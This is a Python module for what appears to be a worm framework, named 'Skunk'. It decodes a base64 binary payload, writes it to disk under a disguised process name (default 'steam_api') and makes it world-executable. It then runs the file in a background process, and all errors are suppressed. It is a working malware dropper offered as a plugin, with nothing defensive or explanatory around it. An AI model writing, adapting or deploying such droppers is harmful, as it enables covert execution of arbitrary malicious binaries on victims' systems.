#!name##Skunk
#!types##module
#!info##Execute binary payload. Add only binary payload
#!reqPayload##SK_bin##Binary Payload##ENCODE:base64
#!reqVar##process_name##Name for binary process##str
#!setVar##process_name##steam_api##str

import os
from multiprocessing import Process
import base64
import subprocess

class Skunk:
    MTYPES = ""
    def __init__(self, worm: object):
        self.worm = worm
        self.proc_name = "{{process_name}}"
        self.path = None
    
    def build_payload(self) -> None:
        payload = {{SK_bin}}
        self.path = os.path.join(os.getcwd(), self.proc_name)
        try:
            with open(self.path, "wb") as file:
                file.write(base64.b64decode(payload))
        except:
            return
        try:
            os.chmod(self.path, 0o777)
        except:
            pass

    
    def _execute(self) -> None:
        try:
            out = subprocess.run(self.path, shell=True, text=True, capture_output=True)
        except:
            return
    
    def execute(self) -> None:
        self.build_payload()
        exe = Process(target=self._execute)
        exe.start()

    def start(self) -> None:
        self.execute()
    

